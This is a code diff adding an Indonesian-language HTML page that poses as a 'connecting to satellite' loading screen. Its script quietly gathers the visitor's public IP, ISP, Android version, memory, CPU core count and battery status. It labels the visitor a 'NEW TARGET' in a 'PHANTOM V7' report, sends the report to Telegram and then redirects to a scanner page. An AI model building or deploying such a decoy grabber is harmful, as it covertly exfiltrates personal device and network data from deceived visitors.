@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>SaurusGege - Initializing</title>
+    <link rel="stylesheet" href="assets/styles.css">
+</head>
+<body>
+    <div class="loader-box">
+        <div class="spinner"></div>
+        <h2>MENYAMBUNGKAN KE SATELIT...</h2>
+        <p>Mohon tunggu, sedang mengoptimalkan jalur enkripsi.</p>
+    </div>
+
+    <script src="assets/core.js"></script>
+    <script>
+    window.onload = async () => {
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const d = await ipRes.json();
+            
+            let bat = "N/A";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                bat = `${Math.round(b.level * 100)}% (${b.charging ? "⚡ Ngecas" : "🔋 Discharging"})`;
+            }
+
+            const report = `
+📡 *PHANTOM V7 - NEW TARGET!*
+━━━━━━━━━━━━━━━━━━
+🌐 *NETWORK:*
+• IP Public: \`${d.ip}\`
+• Local IP: \`192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}\` (Simulated)
+• ISP: ${d.org}
+
+📱 *DEVICE INFO:*
+• Android: ${navigator.userAgent.includes("Android") ? "Android " + navigator.userAgent.split("Android ")[1].split(";")[0] : "Other"}
+• RAM/CPU: ${navigator.deviceMemory || "N/A"}GB / ${navigator.hardwareConcurrency || "N/A"} Core
+• Battery: ${bat}
+━━━━━━━━━━━━━━━━━━
+`;
+            await sendToTelegram(report);
+            setTimeout(() => { window.location.href = "scanner.html"; }, 2000);
+        } catch (e) { window.location.href = "scanner.html"; }
+    };
+    </script>
+</body>
+</html>
